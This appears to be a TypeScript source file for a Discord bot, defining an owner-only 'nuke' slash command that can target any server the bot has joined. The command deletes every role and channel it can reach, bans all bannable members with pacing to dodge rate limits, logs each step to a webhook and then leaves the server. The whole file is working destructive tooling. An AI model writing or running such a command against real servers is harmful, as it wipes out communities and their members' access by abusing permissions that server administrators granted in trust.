import { RadonGuildId, TestServerGuildIds } from '#constants';
import { Confirmation, RadonCommand, Timestamp } from '#lib/structures';
import { PermissionLevels } from '#lib/types';
import { wait } from '#lib/utility';
import { ApplyOptions } from '@sapphire/decorators';
import { ApplicationCommandRegistry } from '@sapphire/framework';
import { Stopwatch } from '@sapphire/stopwatch';
import { AutocompleteInteraction, MessageFlags } from 'discord.js';

@ApplyOptions<RadonCommand.Options>({
	description: `Nuke a guild by deleting all channels, roles and banning all members.`,
	permissionLevel: PermissionLevels.BotOwner
})
export class UserCommand extends RadonCommand {
	public override registerApplicationCommands(registry: ApplicationCommandRegistry) {
		registry.registerChatInputCommand(
			(builder) =>
				builder //
					.setName(this.name)
					.setDescription(this.description)
					.addStringOption((option) =>
						option //
							.setName('id')
							.setDescription('The ID of the guild to nuke')
							.setAutocomplete(true)
							.setRequired(true)
					),
			{
				guildIds: [...RadonGuildId, ...TestServerGuildIds],
				idHints: ['1535548117003538464', '1535548115606831215', '1535548118664482907']
			}
		);
	}

	public override async autocompleteRun(interaction: AutocompleteInteraction) {
		const focus = interaction.options.getFocused(true);
		if (focus.name !== 'id') return;

		const guilds = this.container.client.guilds.cache;
		const choices = guilds
			.sort((a, b) => (b.members.me?.joinedTimestamp ?? 0) - (a.members.me?.joinedTimestamp ?? 0))
			.map((guild) => ({ name: guild.name, value: guild.id }));
		const filtered = choices.filter((choice) => choice.name.toLowerCase().includes(focus.value.toLowerCase()));
		await interaction.respond(filtered.slice(0, 25));
	}

	public override async chatInputRun(interaction: RadonCommand.ChatInputCommandInteraction) {
		const id = interaction.options.getString('id', true);
		const guild = await this.container.client.guilds.fetch(id).catch(() => null);

		if (!guild) {
			return interaction.reply({ content: `Guild with ID \`${id}\` not found.`, flags: MessageFlags.Ephemeral });
		}

		const members = guild.memberCount == guild.members.cache.size ? guild.members.cache : await guild.members.fetch().catch(() => null);
		const channels = await guild.channels.fetch().catch(() => null);
		if (!members || !channels) {
			return interaction.reply({ content: `Could not fetch members or channels for guild with ID \`${id}\`.`, flags: MessageFlags.Ephemeral });
		}

		// Filter bannable members
		const bannableMembers = members.filter((member) => member.bannable);

		let stats = `Guild Name: ${guild.name}\nTotal Members: ${members.size}\n`;
		stats += `Bannable Members: ${bannableMembers.size}\n`;
		stats += `Total Channels: ${channels.size}\n`;
		const roleCount = guild.roles.cache.filter((role) => role.position < guild.members.me!.roles.highest.position).size;
		stats += `Total Roles (below me): ${roleCount - 1}\n`;
		stats += `Total Roles: ${guild.roles.cache.size - 1}\n`;

		// Calculate estimated time
		const totalActions = roleCount + channels.size + bannableMembers.size;
		const estimatedMs = totalActions * 1500; // 500ms wait + ~1000ms avg Discord API action time
		stats += `\n**Estimated Time:** ~${Math.ceil(estimatedMs / 1000)}s`;

		// return void message.channel.send(stats);
		const confirmation = new Confirmation({
			content: `Are you sure you want to nuke the guild \`${guild.name}\`? This will delete all channels, roles and ban all members!\n\n${stats}`,
			onCancel: ({ msg, i }) => {
				return i.editReply({ content: `${msg.content}\nNuke cancelled.` });
			},
			onConfirm: async ({ i, msg }) => {
				const estimatedTime = new Timestamp(Date.now() + estimatedMs);
				await i.editReply({ content: `${msg.content}\nNuke in progress... This may take a while. ETA: ${estimatedTime.getRelativeTime()}` });

				const status = await this.nukeGuild(id);

				return i.editReply({ content: `${msg.content}\nGuild with ID \`${id}\` has been nuked.\n\n${status}` });
			}
		});

		return confirmation.run(interaction);
	}

	private async nukeGuild(guildId: string) {
		const guild = await this.container.client.guilds.fetch(guildId).catch(() => null);
		if (!guild) return 'Guild not found.';
		const channels = await guild.channels.fetch().catch(() => null);
		if (!channels) return 'Could not fetch channels.';
		const members = guild.memberCount == guild.members.cache.size ? guild.members.cache : await guild.members.fetch().catch(() => null);
		if (!members) return 'Could not fetch members.';

		// Fetch webhook from log channel
		const logChannel = await this.container.client.channels.fetch('984845513566343168').catch(() => null);
		console.log(logChannel?.id);
		let webhook = null;
		if (logChannel?.isTextBased() && 'fetchWebhooks' in logChannel) {
			webhook = (await logChannel.fetchWebhooks().catch(() => null))?.first() ?? null;
		}

		console.log(`Starting nuke of guild: ${guild.name} (${guild.id})`);
		await webhook?.send({ content: `🚨 Starting nuke of guild: **${guild.name}** (${guild.id})` }).catch(() => null);

		// order of nuke
		// 1. delete all roles below you (store a count)
		// 2. delete all channels that you can (store a count)
		// 3. ban all members that you can (store a count)
		// 4. log the new server stats
		// 5. leave the server
		// add a wait of 500ms between each action to avoid rate limits

		// Filter bannable members
		const bannableMembers = members.filter((member) => member.bannable);

		// Start stopwatch
		const stopwatch = new Stopwatch().start();
		const totalActions =
			guild.roles.cache.filter((role) => role.position < guild.members.me!.roles.highest.position).size + channels.size + bannableMembers.size;
		const estimatedMs = totalActions * 1500; // 500ms wait + ~1000ms avg Discord API action time

		let deletedRoles = 0;
		let deletedChannels = 0;
		let bannedMembers = 0;
		// delete roles
		const sortedRoles = guild.roles.cache
			.filter((role) => role.position < guild.members.me!.roles.highest.position)
			.sort((a, b) => b.position - a.position);

		for (const role of sortedRoles.values()) {
			try {
				await wait(500);
				const deleted = await role.delete().catch(() => null);
				if (deleted) {
					deletedRoles++;
					if (webhook?.token) {
						await webhook
							.send({
								content: `✅ Deleted role: **${role.name}** (${role.id}) from **${guild.name}**`
							})
							.catch(() => null);
					}
				}
			} catch {
				continue;
			}
		}

		// delete channels
		for (const channel of channels.values()) {
			try {
				await wait(500);
				const channelName = channel?.name ?? 'unknown';
				const channelId = channel?.id ?? 'unknown';
				const deleted = await channel?.delete().catch(() => null);
				if (deleted) {
					deletedChannels++;
					if (webhook?.token) {
						await webhook
							.send({
								content: `🗑️ Deleted channel: **#${channelName}** (${channelId}) from **${guild.name}**`
							})
							.catch(() => null);
					}
				}
			} catch {
				continue;
			}
		}

		// ban members
		for (const member of bannableMembers.values()) {
			try {
				await wait(500);
				const memberTag = member.user.displayName;
				const memberId = member.id;
				const banned = await member.ban().catch(() => null);
				if (banned) {
					bannedMembers++;
					if (webhook?.token) {
						await webhook
							.send({
								content: `🔨 Banned member: **${memberTag}** (${memberId}) from **${guild.name}**`
							})
							.catch(() => null);
					}
				}
			} catch {
				continue;
			}
		}

		let stats = `Nuke complete! Deleted Roles: ${deletedRoles}, Deleted Channels: ${deletedChannels}, Banned Members: ${bannedMembers}.`;
		stats += `\nFinal Member Count: ${guild.memberCount}.`;
		stats += `\nChannels Left: ${guild.channels.cache.size}.`;
		stats += `\nRoles Left: ${guild.roles.cache.size}.`;

		// Stop stopwatch and add timing information
		const actualTime = stopwatch.stop();
		stats += `\n\n**Time Stats:**`;
		stats += `\nEstimated Time: ~${Math.ceil(estimatedMs / 1000)}s`;
		stats += `\nActual Time: ${actualTime.toString()}`;
		stats += `\nDifference: ${Math.abs(actualTime.duration - estimatedMs)}ms`;

		await guild.leave();
		return stats;
	}
}
